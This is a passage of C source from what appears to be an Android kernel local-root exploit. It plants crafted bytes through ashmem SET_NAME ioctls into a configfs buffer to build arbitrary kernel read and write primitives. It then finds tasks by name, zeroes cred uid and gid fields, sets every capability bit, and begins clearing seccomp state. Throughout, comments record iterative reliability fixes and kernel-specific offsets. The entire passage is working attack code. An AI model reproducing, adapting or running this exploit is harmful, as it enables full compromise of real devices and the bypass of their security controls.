 * bytes are 0 and SET_NAME is a C-string carrier (strcpy, ashmem.c:564), so
 * every zero byte cost one extra tombstone SET_NAME => ~56-60 ioctls per
 * plant, each one a fresh partial-landing opportunity (plant channel 6 ran
 * 2/10). r34 re-encodes the plant against the REAL consumption semantics of
 * this kernel (fs/configfs/file.c + kernel/locking/mutex.c, cited per row):
 *
 *  cfg field   consumed by                          constraint         r34 encoding
 *  ----------  ------------------------------------  -----------------  -------------------
 *  0x00 count  simple_read_from_buffer avail         huge positive      untouched ("dev/ashm")
 *              (fs/libfs.c:628-646)                  ASCII, keep
 *  0x08 pos    NEVER (configfs_read_file passes the  none               0x41 fill
 *              VFS *ppos to simple_read_from_buffer;
 *              buffer->pos is dead in this file.c)
 *  0x10 page   read src base (file.c:129: from +     any kernel VA      v - tail, read pos = tail
 *              *ppos via copy_to_user)
 *  0x18 ops    assigned (file.c:414), never read     none               0x41 fill
 *  0x20..0x27  mutex_lock (file.c:121/294/325) ->    owner==0 => fast   ZERO x8
 *              mutex.c:236-243 __mutex_trylock_fast: path; nonzero owner
 *              atomic cmpxchg on lock->owner ONLY;   => slowpath =>
 *              wait_lock/osq/wait_list untouched     wait_list ops on
 *                                                    garbage => KE
 *  0x28..0x3F  wait_lock/osq/wait_list — only the    none on the fast   0x41 fill
 *              slow path reads them                  path
 *  0x40..0x43  needs_read_fill (file.c:122): !=0 =>  MUST be 0        ZERO x4
 *              fill_read_buffer => to_frag(file) =
 *              ashmem dentry d_fsdata (NULL) -> NULL
 *              deref => KE; fill also attr->show
 *              via *(cfg 0x68) = NULL
 *  0x44        read_in_progress (file.c:328): !=0 => MUST be 0        ZERO
 *              pwrite -ETXTBSY
 *  0x45        write_in_progress: set true by every  text read never    0x41 fill
 *              pwrite (file.c:332); only the bin     checks it
 *              read path / release read it
 *  0x48        write dst base (file.c:363:           any kernel VA      v - tail, write pos = tail
 *              simple_write_to_buffer to + *ppos)
 *  0x50..0x53  bin_buffer_size (file.c:335/337:      pos + count <=     0x7FFFFFFF (int)
 *              grow branch + simple_write_to_buffer  size else grow/EFBIG
 *              available)
 *  0x54..0x57  cb_max_size (file.c:337): a runaway   keep non-zero      0x7FFFFFFF (clean -EFBIG
 *              pos fails CLEANLY instead of taking   (= the EFBIG guard) instead of wild vmalloc
 *              the vmalloc/memcpy-from-bin grow path                    + vfree path)
 *  0x58/0x60/  item/owner/attr — only the dead       none               untouched (kzalloc 0)
 *  0x68        fill/store paths
 *
 * Tail compensation (aresin util.c:954 trick): kernel pointer low bytes are
 * often 0 (page-aligned bases); the slot is planted with (v - tail), all 8
 * bytes non-zero (the tail borrows through every zero byte), and the
 * pread/pwrite is issued at pos = tail, so slot + pos == v exactly. Reads
 * have no practical pos bound (available = the ASCII count field ~7.9e18);
 * writes are bounded by bin_buffer_size (int) => tail < 0x7F000000.
 * Targets therefore need NO zero-byte property (the r33-planned FATAL on
 * zero-bearing targets becomes an automatic fixup; FATAL remains only if
 * the fixup loop cannot converge — kernel VAs carry 0xFF in the top bytes,
 * so it always does).
 *
 * SET_NAME cost per plant: page-only (reads) = 1 ioctl (r33: ~56-60);
 * full (writes) = ~14 ioctls (1 + 13 structural zeros; r33: ~56-60). */
#define T37_BLOB_LEN      0x4Du  /* full blob: asma+0x0B .. asma+0x57 */
#define T37_BLOB_SHORT    0x0Du  /* page-only blob: asma+0x0B .. asma+0x17 */
#define T37_BLOB_FILL     0x41u
/* structural-zero byte runs inside the blob (see the table; blob off =
 * cfg off - 0x0B): mutex.owner (cfg 0x20..0x27) and needs_read_fill +
 * read_in_progress (cfg 0x40..0x44). */
#define T37_BLOB_ZERO_OWNER_OFF 0x15u
#define T37_BLOB_ZERO_NRF_OFF   0x35u   /* 5 bytes: cfg 0x40..0x44 */
/* size quad planted at cfg 0x50..0x57: every byte non-zero as the string
 * carrier demands; bin_buffer_size = 0x7FFFFFFF covers any write pos we
 * can encode, cb_max_size = 0x7FFFFFFF turns a runaway pos into a clean
 * -EFBIG instead of the vmalloc/memcpy/vfree grow path. */
#define T37_SIZE_QUAD     0x7FFFFFFF7FFFFFFFULL
#define T37_WR_MAX_TAIL   0x7F000000ULL      /* write pos bound (< size) */
#define T37_RD_MAX_TAIL   0x00FFFFFFFFFFFFULL /* read pos bound (< avail) */
#define GL36_ASHMEM_GET_NAME 0x81007702ULL  /* _IOR(0x77,2,char[267]) */

static inline void t37_put64le(unsigned char *p, uint64_t v)
{
	int i;

	for (i = 0; i < 8; i++)
		p[i] = (unsigned char)(v >> (8 * i));
}

/* r34: encode v as (v - tail) with no zero byte in the 8-byte slot value;
 * the caller reads/writes at pos = tail (slot + pos == v). tail starts at
 * tail0 (the marker's boot tail for reads — keeps the kread miss-sentinel
 * at marker offset 0) and each fixup adds 1<<(8k), borrowing through the
 * lowest remaining zero byte. FATAL only if 64 fixups cannot converge or
 * the pos bound would be exceeded. */
static int t37_enc_va(uint64_t v, uint64_t tail0, uint64_t max_tail,
		      uint64_t *enc_out, uint64_t *tail_out)
{
	uint64_t tail = tail0;
	int it;

	if (!v)
		return -1;
	for (it = 0; it < 64; it++) {
		uint64_t enc = v - tail;
		int k, clean = 1;

		if (enc > v || tail > max_tail)
			return -1;      /* underflow below 0 / pos bound hit */
		for (k = 0; k < 8; k++) {
			if (((enc >> (8 * k)) & 0xff) == 0) {
				clean = 0;
				break;
			}
		}
		if (clean) {
			*enc_out = enc;
			*tail_out = tail;
			return 0;
		}
		tail += 1ULL << (8 * k);   /* borrow fixes byte k */
	}
	return -1;
}

static int t37_enc_tail(uint64_t v, uint64_t tail0, uint64_t max_tail,
			uint64_t *tail_out)
{
	uint64_t enc;

	return t37_enc_va(v, tail0, max_tail, &enc, tail_out);
}

/* the marker page's encoding tail, fixed per boot: every page slot is
 * planted as (g_page_base - g_tail_pg) and read at pos = g_tail_pg, so a
 * fixup-free target read has its miss-sentinel at marker offset 0 — the
 * exact r33 sentinel geometry. */
static uint64_t g_tail_pg;

static int t37_tail_pg_init(void)
{
	uint64_t enc, tail;

	if (g_tail_pg)
		return 0;
	if (!g_page_base)
		return -1;
	if (t37_enc_va(g_page_base, 0x0A0A, T37_RD_MAX_TAIL, &enc, &tail) != 0) {
		LOGI("[t37] r34: marker tail ENCODE FAIL (page %s) — FATAL",
		     u64hex(g_page_base));
		return -1;
	}
	g_tail_pg = tail;
	LOGI("[t37] r34: marker tail = %s (page slot plants %s)",
	     u64hex(g_tail_pg), u64hex(enc));
	return 0;
}

/* r22 GET_NAME round-trip: proves the SET_NAME channel is alive and the
 * name prefix intact (the prefix is all any plant ever writes at name[0..10];
 * the [11] tombstone keeps strlen at 10, r22 empirical truth). It can NOT
 * see the blob bytes; the VALUE landing is proven by the content-known gate
 * preads and the kread sentinel. */
static int t37_name_roundtrip(int fd)
{
	unsigned char got[267];

	memset(got, 0, sizeof(got));
	errno = 0;
	if (ioctl(fd, GL36_ASHMEM_GET_NAME, got) != 0) {
		LOGI("[t37] root: GET_NAME verify ioctl FAIL errno=%d", errno);
		return -1;
	}
	/* 38-r38 fix A: with fix B in place name[11] == 0, so get_name takes
	 * the CONSTANT branch (ashmem.c:591-592) and returns "dev/ashmem\0"
	 * — the r22 expectation. (research/38-setname-offset-attribution.md:
	 * the constant is 11 bytes and is NOT a dump of name[0..10], which
	 * actually holds "dev/ashmem/" — 11 chars with the slash.) The r37
	 * hex16 forensics line is kept for any future divergence. */
	if (memcmp(got, "dev/ashmem", 10) != 0 || got[10] != 0) {
		char hx[80];
		int i, o = 0;

		for (i = 0; i < 16 && o < (int)sizeof(hx) - 4; i++)
			o += snprintf(hx + o, sizeof(hx) - o, "%02x", got[i]);
		hx[o] = 0;
		LOGI("[t37] root: plant VERIFY FAIL — name prefix corrupted: "
		     "'%.12s' hex16=%s (SET_NAME channel)", got, hx);
		return -1;
	}
	return 0;
}

/* r34 SHORT plant: the PAGE slot only, zero-free blob => exactly ONE
 * SET_NAME. cfg >= 0x18 (ops/mutex/needs_read_fill/bin_buffer/size) is left
 * untouched; the string terminator parks at cfg 0x18 (ops byte 0 — never
 * read). tail_out = the pos every pread must use (slot + pos = page_va). */
static int t37_cfg_put64(int fd, uint64_t page_va, uint64_t tail0,
			 uint64_t max_tail, uint64_t *tail_out)
{
	unsigned char blob[T37_BLOB_SHORT];
	uint64_t enc, tail;

	if (t37_enc_va(page_va, tail0, max_tail, &enc, &tail) != 0) {
		LOGI("[t37] r34: page plant ENCODE FAIL (%s) — unplantable VA",
		     u64hex(page_va));
		return -1;
	}
	memset(blob, T37_BLOB_FILL, sizeof(blob));
	t37_put64le(blob + (GL36_CFGBUF_PAGE_OFF - GL36_ASHMEM_NAME_PREFIX_LEN),
		    enc);
	if (t37_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0)
		return -1;
	if (t37_name_roundtrip(fd) != 0)
		return -1;
	*tail_out = tail;
	return 0;
}

/* r34 FULL plant: page (marker residue) + bin_buffer (write dst) + the size
 * quad in ONE blob over cfg 0x0B..0x57. The 13 structural-zero bytes force
 * the tombstone dance (~14 SET_NAMEs); every value byte is non-zero by
 * construction. bin_tail_out = the pwrite pos (slot + pos = bin_va). */
static int t37_cfg_plant_full(int fd, uint64_t bin_va, uint64_t tail0,
			      uint64_t max_tail, uint64_t *bin_tail_out)
{
	unsigned char blob[T37_BLOB_LEN];
	uint64_t enc_pg, enc_bin, tail_pg, tail_bin;

	if (t37_tail_pg_init() != 0)
		return -1;
	/* page field = the MARKER (fixed boot tail): a later missed short
	 * plant leaves reads pointed at our own page — the r33 residue
	 * invariant "a missed plant can only leave page = g_page_base". */
	if (t37_enc_va(g_page_base, g_tail_pg, T37_RD_MAX_TAIL,
		       &enc_pg, &tail_pg) != 0)
		return -1;
	if (t37_enc_va(bin_va, tail0, max_tail, &enc_bin, &tail_bin) != 0) {
		LOGI("[t37] r34: bin plant ENCODE FAIL (%s) — unplantable VA",
		     u64hex(bin_va));
		return -1;
	}
	memset(blob, T37_BLOB_FILL, sizeof(blob));
	memset(blob + T37_BLOB_ZERO_OWNER_OFF, 0, 8);
	memset(blob + T37_BLOB_ZERO_NRF_OFF, 0, 5);
	t37_put64le(blob + (GL36_CFGBUF_PAGE_OFF -
			    GL36_ASHMEM_NAME_PREFIX_LEN), enc_pg);
	t37_put64le(blob + (GL36_CFGBUF_BIN_BUFFER_OFF -
			    GL36_ASHMEM_NAME_PREFIX_LEN), enc_bin);
	t37_put64le(blob + (GL36_CFGBUF_BIN_BUFFER_SIZE_OFF -
			    GL36_ASHMEM_NAME_PREFIX_LEN), T37_SIZE_QUAD);
	if (t37_set_ashmem_name_blob(fd, blob, sizeof(blob)) != 0)
		return -1;
	if (t37_name_roundtrip(fd) != 0)
		return -1;
	*bin_tail_out = tail_bin;
	return 0;
}

/* ==== 38-r34: plant-landing guard (r33 guard, re-encoded) ==================
 * KE19/20/21 family: a SET_NAME blob randomly fails to land its bytes into
 * asma->name → the page/bin_buffer slot keeps a stale or garbage value →
 * the next pread/pwrite dereferences it (__arch_copy_to_user+0xe4). The
 * GET_NAME round-trip (r22) cannot see the blob, so verification uses
 * content-known reads. r34 keeps EVERY r33 guard and swaps the plant
 * economics underneath (single-SET_NAME page plants, ~14-ioctl full plants
 * instead of ~56-60):
 *
 *   - GATE (every kread/kwrite): ONE short plant pins page = marker - tail_pg;
 *     pread at tail_pg returns the marker head, compared against the
 *     user-side view (g_page_map — same physical page, mlocked). Proves the
 *     SET_NAME channel landed bytes RIGHT NOW and leaves page at the
 *     harmless marker residue. bin_buffer/size are NOT touched by reads
 *     (configfs_read_file never consumes them), so they keep the last
 *     restore's safe values (see t37_plant_residue).
 *   - WRITE gate = header pin + full plant + canary roundtrip:
 *     "T3H<seq>" is pinned into the marker head via the USER mapping (same
 *     physical page — the [11a] llseek repair already relies on this; zero
 *     syscalls vs r33's kernel pwrite), so the header is never all-zero —
 *     otherwise a zero-value write (cred clearing!) could false-pass its
 *     readback against the residue read. Then ONE full plant leaves
 *     bin_buffer = scratch - tail_s, the gate pread re-proves the landing,
 *     and a canary pwrite at tail_s lands in OUR marker page (harmless even
 *     if bin_buffer itself missed); the hardened kread(scratch) must equal
 *     THIS run's sequence-stamped canary (a stale match is impossible).
 *   - kread sentinel: a missed target plant leaves page = marker - tail_pg,
 *     so the read returns marker + (tail_t - tail_pg) bytes — compared
 *     against the known g_page_map window whenever the offset stays inside
 *     the page (fixup tails that push it out disable the sentinel; reads
 *     never corrupt, and the caller's content checks still bind).
 *   - kwrite closes with a readback roundtrip — a write is only reported
 *     landed when reading TARGET back equals the bytes we wrote — and
 *     re-establishes the residue (bin_buffer = scratch) on every exit path.
 *   - every failing step retries idempotently ≤3 (a retry re-plants the
 *     FULL state — SET_NAME rewrites everything, no partial state persists);
 *     retries exhausted → -1 (callers keep their FATAL/degrade semantics).
 * Residual KE risk: a PARTIALLY-landed slot (mixed old/new bytes) still
 * dereferences garbage — the gate proves the channel was healthy an instant
 * earlier, and r34's shorter chains shrink the window, so this stays a
 * second-order effect. ================================================ */
#define T37_PLANT_RETRIES 3
/* in-marker-page regions */
#define T37_SCRATCH_OFF     0xC00u   /* r28-empirically free zone */
#define T37_NULL_TABLE_OFF  0xF00u   /* all-zero fops table (null-restore) */

static uint32_t g_gate_seq;   /* canary stamp: fresh per gate, kills stale
                               * matches (scratch/header keep last run's
                               * bytes — an equality check against a STATIC
                               * canary would false-pass on leftovers) */

static void t37_gate_canaries(char *can, char *hdr)
{
	g_gate_seq++;
	snprintf(can, 9, "T3G%05u", (unsigned)(g_gate_seq % 100000u));
	snprintf(hdr, 9, "T3H%05u", (unsigned)(g_gate_seq % 100000u));
	can[8] = 0;
	hdr[8] = 0;
}

/* residue re-establish: bin_buffer = in-marker scratch (the harmless write
 * dst), size quad refreshed. The r33 invariant: after every kwrite, a later
 * missed plant can only ever write into OUR marker page. */
static int t37_plant_residue(int fd)
{
	uint64_t scratch = g_page_base + T37_SCRATCH_OFF;
	uint64_t tail;

	return t37_cfg_plant_full(fd, scratch, g_tail_pg, T37_WR_MAX_TAIL,
				  &tail);
}

/* r34 read gate: ONE short plant (page = marker - tail_pg, single
 * SET_NAME) + one content-known pread at tail_pg (returns the marker head,
 * including the write gate's T3H pin when armed). r33 needed a 3-field
 * full plant (~56 SET_NAMEs) for the same proof. */
static int t37_canary_read_gate(int fd)
{
	uint64_t v = 0;
	uint64_t tail;

	if (!g_page_map)
		return -1;
	if (t37_tail_pg_init() != 0)
		return -1;
	if (t37_cfg_put64(fd, g_page_base, g_tail_pg, T37_RD_MAX_TAIL,
			  &tail) != 0)
		return -1;
	errno = 0;
	if (pread(fd, &v, 8, g_tail_pg) != 8)
		return -1;
	return memcmp(&v, g_page_map, 8) == 0 ? 0 : -1;
}

static ssize_t t37_kread_data(int fd, uint64_t target, void *out, size_t len);
/* (physrw fwd decls were hoisted above the physrw engine) */

/* r34 write gate: header pin (user-space memcpy) + ONE full plant (page =
 * marker, bin_buffer = scratch - tail_s, size quad) + gate pread + canary
 * pwrite at tail_s + hardened kread(scratch) roundtrip. tail_t = THIS
 * target's encoding tail (the business write will use the same tail, so a
 * missed business plant lands its pwrite at scratch + (tail_t - tail_s) —
 * typically exactly the scratch). */
static int t37_canary_write_gate(int fd, uint64_t tail_t, uint64_t *tail_s_out)
{
	char can[9], hdr[9];
	uint64_t scratch = g_page_base + T37_SCRATCH_OFF;
	uint64_t tail_s, v = 0;
	uint8_t rb[8];

	t37_gate_canaries(can, hdr);
	if (g_page_map)
		memcpy(g_page_map, hdr, 8);   /* header pin via the user view */
	if (t37_cfg_plant_full(fd, scratch, tail_t, T37_WR_MAX_TAIL,
			       &tail_s) != 0)
		return -1;
	errno = 0;
	if (pread(fd, &v, 8, g_tail_pg) != 8 || memcmp(&v, g_page_map, 8) != 0)
		return -1;      /* page slot / channel not landed */
	errno = 0;
	if (pwrite(fd, can, 8, tail_s) != 8)
		return -1;      /* bin = scratch - tail_s -> lands at scratch */
	if (t37_kread_data(fd, scratch, rb, sizeof(rb)) !=
	    (ssize_t)sizeof(rb))
		return -1;      /* canary not on scratch THIS run */
	if (memcmp(rb, can, 8) != 0)
		return -1;
	*tail_s_out = tail_s;
	return 0;
}

/* read: r34 — gate (ONE short plant + content-known pread), then ONE short
 * target plant, pread at the target tail (slot + pos = target), sentinel
 * check, retries <= 3. TWO SET_NAMEs per attempt (r33: ~112). */
static ssize_t t37_kread_data(int fd, uint64_t target, void *out, size_t len)
{
	int attempt;

	for (attempt = 1; attempt <= T37_PLANT_RETRIES; attempt++) {
		size_t cmp = len < 4096 ? len : 4096;
		uint64_t tail_t;
		ssize_t r;

		if (!g_page_map || t37_tail_pg_init() != 0)
			return -1;
		if (t37_canary_read_gate(fd) != 0) {
			LOGI("[t37] r34 kread gate FAIL try %d/%d (target %s) — "
			     "re-plant", attempt, T37_PLANT_RETRIES,
			     u64hex(target));
			continue;
		}
		if (target == g_page_base) {
			tail_t = g_tail_pg;   /* the gate blob already points page here */
		} else if (t37_cfg_put64(fd, target, g_tail_pg, T37_RD_MAX_TAIL,
					 &tail_t) != 0) {
			LOGI("[t37] r34 kread target plant FAIL try %d/%d",
			     attempt, T37_PLANT_RETRIES);
			continue;
		}
		errno = 0;
		r = pread(fd, out, len, tail_t);
		if (r != (ssize_t)len) {
			LOGI("[t37] r34 kread pread FAIL try %d/%d (target %s "
			     "len %zu errno=%d %s)", attempt, T37_PLANT_RETRIES,
			     u64hex(target), len, errno, errno_name(errno));
			continue;
		}
		if (target != g_page_base && cmp >= 1 && tail_t >= g_tail_pg &&
		    (tail_t - g_tail_pg) + cmp <= 4096 &&
		    memcmp(out, g_page_map + (tail_t - g_tail_pg), cmp) == 0) {
			/* page slot never switched — this is OUR marker page
			 * (at the tail-shifted offset), not the target.
			 * Harmless, retried. */
			LOGI("[t37] r34 kread plant-MISS (readback = marker page "
			     "copy, target %s) try %d/%d — re-plant",
			     u64hex(target), attempt, T37_PLANT_RETRIES);
			continue;
		}
		return r;
	}
	LOGI("[t37] r34 kread retries EXHAUSTED (target %s len %zu)",
	     u64hex(target), len);
	return -1;
}

/* write: r34 — per attempt: the write gate (header pin + ONE full plant
 * with bin_buffer = scratch + canary roundtrip), then the business full
 * plant (bin_buffer = target - tail_t) + pwrite at tail_t + a readback
 * roundtrip via the hardened kread; every exit path re-establishes the
 * scratch residue. ~3 full plants + 2 short plants per attempt (r33:
 * ~224 SET_NAMEs). */
static ssize_t t37_kwrite_data(int fd, uint64_t target, const void *data,
			       size_t len)
{
	int attempt;

	for (attempt = 1; attempt <= T37_PLANT_RETRIES; attempt++) {
		uint64_t tail_t, tail_t2, tail_s;
		uint8_t rb[64];
		ssize_t w;

		if (!g_page_map || t37_tail_pg_init() != 0)
			return -1;
		if (t37_enc_tail(target, g_tail_pg, T37_WR_MAX_TAIL,
				 &tail_t) != 0) {
			LOGI("[t37] r34 kwrite ENCODE FAIL (target %s) — "
			     "unplantable VA", u64hex(target));
			(void)t37_plant_residue(fd);
			return -1;   /* FATAL: no retry can fix the encoding */
		}
		if (t37_canary_write_gate(fd, tail_t, &tail_s) != 0) {
			LOGI("[t37] r34 kwrite gate FAIL try %d/%d (target %s) — "
			     "re-plant", attempt, T37_PLANT_RETRIES,
			     u64hex(target));
			continue;
		}
		/* business slot: bin = target - tail_t (clean by construction).
		 * If THIS plant missed, bin_buffer still holds the gate's
		 * scratch - tail_s => the pwrite lands at scratch +
		 * (tail_t - tail_s) — inside OUR marker page for the common
		 * (fixup-free) case — and the readback below catches the
		 * miss either way. */
		if (t37_cfg_plant_full(fd, target, tail_t, T37_WR_MAX_TAIL,
				       &tail_t2) != 0) {
			LOGI("[t37] r34 kwrite target plant FAIL try %d/%d",
			     attempt, T37_PLANT_RETRIES);
			continue;
		}
		errno = 0;
		w = pwrite(fd, data, len, tail_t2);
		if (w != (ssize_t)len) {
			LOGI("[t37] r34 kwrite pwrite FAIL try %d/%d (target %s "
			     "len %zu errno=%d %s)", attempt, T37_PLANT_RETRIES,
			     u64hex(target), len, errno, errno_name(errno));
			continue;
		}
		if (len > sizeof(rb)) {
			(void)t37_plant_residue(fd);
			return w;        /* oversized payloads: no readback */
		}
		if (t37_kread_data(fd, target, rb, len) != (ssize_t)len) {
			LOGI("[t37] r34 kwrite readback FAIL try %d/%d "
			     "(target %s)", attempt, T37_PLANT_RETRIES,
			     u64hex(target));
			continue;
		}
		if (memcmp(rb, data, len) != 0) {
			LOGI("[t37] r34 kwrite readback MISMATCH try %d/%d "
			     "(target %s) — re-plant", attempt,
			     T37_PLANT_RETRIES, u64hex(target));
			continue;
		}
		(void)t37_plant_residue(fd);   /* residue = scratch again */
		return w;
	}
	(void)t37_plant_residue(fd);
	LOGI("[t37] r34 kwrite retries EXHAUSTED (target %s len %zu)",
	     u64hex(target), len);
	return -1;
}

static uint64_t t37_kread64(int fd, uint64_t target)
{
	uint64_t v = 0;
	if (t37_kread_data(fd, target, &v, sizeof(v)) != (ssize_t)sizeof(v))
		return 0;
	return v;
}

static int t37_kwrite64(int fd, uint64_t target, uint64_t val)
{
	return t37_kwrite_data(fd, target, &val, sizeof(val)) ==
	       (ssize_t)sizeof(val) ? 0 : -1;
}

/* open a hijackable ashmem fd: libcutils alias node (36 §4 — primary node
 * is SELinux-denied for shell; alias nodes carry label ashmem_libcutils_device,
 * same miscdevice 10:104). r17 bug: strncmp(n=7) compared "ashmem\0" vs
 * "ashmem2…" and NEVER matched the uuid alias (KE13 root cause for the
 * stalled window). n=6 + len>6. */
static int t37_open_ashmem_alias(void)
{
	DIR *d;
	struct dirent *e;
	const char *primary = "ashmem";

	d = opendir("/dev");
	if (!d)
		return -1;
	while ((e = readdir(d)) != NULL) {
		if (strncmp(e->d_name, primary, 6) == 0 &&
		    strlen(e->d_name) > 6) {
			char path[300];
			int fd;

			snprintf(path, sizeof(path), "/dev/%s", e->d_name);
			fd = open(path, O_RDWR);
			if (fd >= 0) {
				struct stat st;
				int rv = fstat(fd, &st);

				closedir(d);
				/* 38-r37: the 'AAAAA' form (boot I) could mean
				 * this alias node drifted off the ashmem
				 * miscdevice — rdev MUST be 10:104. */
				if (rv == 0)
					LOGI("[t37] root: alias %s fd=%d "
					     "rdev=%u:%u (expect 10:104)",
					     path, fd, major(st.st_rdev),
					     minor(st.st_rdev));
				else
					LOGI("[t37] root: alias %s fd=%d "
					     "fstat FAIL errno=%d", path, fd,
					     errno);
				return fd;
			}
			LOGI("[t37] root: open %s FAIL errno=%d(%s)", path,
			     errno, errno_name(errno));
		}
	}
	closedir(d);
	return -1;
}

/* find task by COMM via init_task tasks list. r27: the numeric pid@0x5C8
 * is UNVERIFIED on this kernel (sys_getpid uses struct pid, not the numeric
 * field — no disasm anchor), but comm@0x798 is VERIFIED (init_task's baked
 * "swapper" @ exactly this offset). Threads self-setname ("t37root" /
 * "t37victim") and the walk matches 16B comm. Block read [0x4C8, 0x808)
 * (832B) covers tasks.next AND comm; slab-bounds usercopy-safe. */
#define T37_WALK_BLK   0x340u                       /* [0x4C8, 0x808) */
#define T37_COMM_INBLK (0x798u - 0x4C8u)            /* comm offset inside blk */
static uint64_t t37_find_task_by_comm(int fd, const char *comm)
{
	uint64_t head = g_slide + GL36_INIT_TASK_STATIC + GL36_TASK_TASKS_OFF;
	uint64_t entry;
	int guard;

	entry = t37_kread64(fd, head);
	if (!entry)
		LOGI("[t37] root: walk: head read gave 0 (entry read FAIL)");
	for (guard = 0; guard < 4096 && entry; guard++) {
		uint64_t task = entry - GL36_TASK_TASKS_OFF;
		uint8_t blk[T37_WALK_BLK];

		if (entry == head) {
			LOGI("[t37] root: walk: full circle after %d hops, no comm "
			     "match", guard);
			return 0;
		}
		if (t37_kread_data(fd, task + GL36_TASK_TASKS_OFF,
				   blk, sizeof(blk)) != (ssize_t)sizeof(blk)) {
			LOGI("[t37] root: walk: read FAIL at hop %d task=%s "
			     "(errno=%d)", guard, u64hex(task), errno);
			return 0;
		}
		entry = *(uint64_t *)blk;   /* tasks.next for the next hop */
		if (memcmp(blk + T37_COMM_INBLK, comm, strlen(comm)) == 0 &&
		    blk[T37_COMM_INBLK + strlen(comm)] == 0)
			return task;
	}
	if (guard >= 4096)
		LOGI("[t37] root: walk: guard exhausted (4096 hops), no comm match");
	return 0;
}

/* 41-r123: thread-group walk (offprobe-verified chain: leader->thread_group
 * @0x678 strings ALL group threads; victim is a THREAD so the tasks list
 * walk can't see it — r28 note). Two reads per hop, 256-hop guard. */
static uint64_t t37_find_task_by_pid_in_group(int fd, uint64_t leader, int pid)
{
	uint64_t node = t37_kread64(fd,
		leader + GL36_TASK_THREAD_GROUP_OFF);
	int guard;

	if (!node)
		return 0;
	for (guard = 0; guard < 256 && node; guard++) {
		uint64_t t = node - GL36_TASK_THREAD_GROUP_OFF;
		uint32_t tp = 0;

		if (t37_kread_data(fd, t + GL36_TASK_PID_OFF, &tp, 4) != 4)
			return 0;
		if ((int)tp == pid)
			return t;
		if (t == leader)
			return 0;   /* full circle, no match */
		node = t37_kread64(fd, t + GL36_TASK_THREAD_GROUP_OFF);
	}
	return 0;
}


static int t37_patch_cred(int fd, uint64_t task)
{
	const uint64_t CAP_FULL = 0x000001ffffffffffULL;
	uint64_t cred, real_cred, sec;
	int i;
	int fail = 0;

	real_cred = t37_kread64(fd, task + GL36_TASK_REAL_CRED_OFF);
	cred = t37_kread64(fd, task + GL36_TASK_CRED_OFF);
	if (!cred) {
		LOGI("[t37] root: cred@0x790 read failed");
		return -1;
	}
	LOGI("[t37] root: task=%s real_cred=%s cred=%s", u64hex(task),
	     u64hex(real_cred), u64hex(cred));
	/* aresin patch_cred_object: identity zeros + securebits + caps + sid.
	 * r31: per-step journaling — the r30 hard-reboot (no KE db) died
	 * somewhere in this loop; each write now logs BEFORE it fires. */
	for (i = 0; i < 4; i++) {
		LOGI("[t37] root: cred write step %d/10 (uid/gid qword @cred+%#x)",
		     i + 1, 4 + i * 8);
		if (t37_kwrite64(fd, cred + 4 + i * 8, 0) != 0) {
			LOGI("[t37] root: cred write step %d FAIL errno=%d",
			     i + 1, errno);
			fail = 1;
		}
	}
	LOGI("[t37] root: cred write step 5/10 (securebits @cred+0x24)");
	if (t37_kwrite_data(fd, cred + 0x24, "\0\0\0\0", 4) != 4) {
		LOGI("[t37] root: cred write step 5 FAIL errno=%d", errno);
		fail = 1;
	}
	for (i = 0; i < 5; i++) {
		LOGI("[t37] root: cred write step %d/10 (cap word %d @cred+%#x)",
		     i + 6, i, 0x30 + i * 8);
		if (t37_kwrite64(fd, cred + 0x30 + i * 8, CAP_FULL) != 0) {
			LOGI("[t37] root: cred write step %d FAIL errno=%d",
			     i + 6, errno);
			fail = 1;
		}
	}
	LOGI("[t37] root: cred write step 11 (read security ptr)");
	sec = t37_kread64(fd, cred + 0x78);
	/* 38-r32: sid write SKIPPED — r31 hard-stalled inside this pwrite
	 * (no KE, no return; step 12 was the last journal line). uid0 +
	 * CAP_FULL already constitute root; the sid pair only affects the
	 * SELinux domain and can be restored later via the manager. */
	LOGI("[t37] root: sid write skipped (r32; sec=%s)", u64hex(sec));
	if (!sec)
		LOGI("[t37] root: note security ptr NULL");
	if (fail) {
		LOGI("[t37] root: cred patch partial fail (cred=%s)", u64hex(cred));
		return -1;
	}
	if (real_cred != cred) {
		fail = 0;
		for (i = 0; i < 4; i++)
			if (t37_kwrite64(fd, real_cred + 4 + i * 8, 0) != 0)
				fail = 1;
		if (t37_kwrite_data(fd, real_cred + 0x24, "\0\0\0\0", 4) != 4)
			fail = 1;
		for (i = 0; i < 5; i++)
			if (t37_kwrite64(fd, real_cred + 0x30 + i * 8, CAP_FULL) != 0)
				fail = 1;
		sec = t37_kread64(fd, real_cred + 0x78);
		/* 38-r33: real_cred sid write SKIPPED too — same discipline as
		 * the cred side (r31 hard-stalled inside a sid pwrite; uid0 +
		 * CAP_FULL already constitute root). */
		LOGI("[t37] root: real_cred sid write skipped (r33; sec=%s)",
		     u64hex(sec));
		if (fail)
			LOGI("[t37] root: real_cred patch partial fail");
	}
	/* verify uid via primitive — 38-r39 fix: the old check kread64(cred)
	 * read {usage, uid} (cred+0 is the atomic_t refcount!) and compared
	 * the LOW 32 bits (usage — a healthy count like 0xf) against 0, so a
	 * PERFECTLY PATCHED cred failed the check (boot K r38: chk = 0xf =
	 * usage 15, uid half already 0). Read the uid field itself @cred+4. */
	{
		uint32_t uidv = 0xffffffff;

		if (t37_kread_data(fd, cred + 4, &uidv, 4) == 4)
			LOGI("[t37] root: cred uid field = %u %s", uidv,
			     uidv == 0 ? "(OK, root)" : "(!= 0)");
		else
			LOGI("[t37] root: cred uid field read FAIL");
		if (uidv != 0) {
			LOGI("[t37] root: cred uid verify FAIL (uid=%u)", uidv);
			return -1;
		}
	}
	LOGI("[t37] root: cred patched (uid/gid/caps/sid all applied)");
	return 0;
}

/* aresin patch_task_seccomp (RC:241-295) + this-kernel disasm anchors:
 * mode@0x838 (=2104, __secure_computing+0x00c), filter_count@0x83C,
 * filter@0x840; TIF_SECCOMP=bit11 in thread_info.flags@task+0x00;
 * PFA_NO_NEW_PRIVS=bit0 in atomic_flags@task+0x590. */
static int t37_patch_seccomp(int fd, uint64_t task)
{
	uint64_t flags, aflags;
	int fail = 0;

	flags = t37_kread64(fd, task + 0x00);
	aflags = t37_kread64(fd, task + 0x590);
	if (t37_kwrite64(fd, task + 0x00, flags & ~(1ULL << 11)) != 0)
		fail = 1;
	if (t37_kwrite64(fd, task + 0x590, aflags & ~(1ULL << 0)) != 0)
		fail = 1;
	if (t37_kwrite_data(fd, task + 0x838, "\0\0\0\0", 4) != 4)      /* mode */
		fail = 1;
	if (t37_kwrite_data(fd, task + 0x83C, "\0\0\0\0", 4) != 4)      /* count */
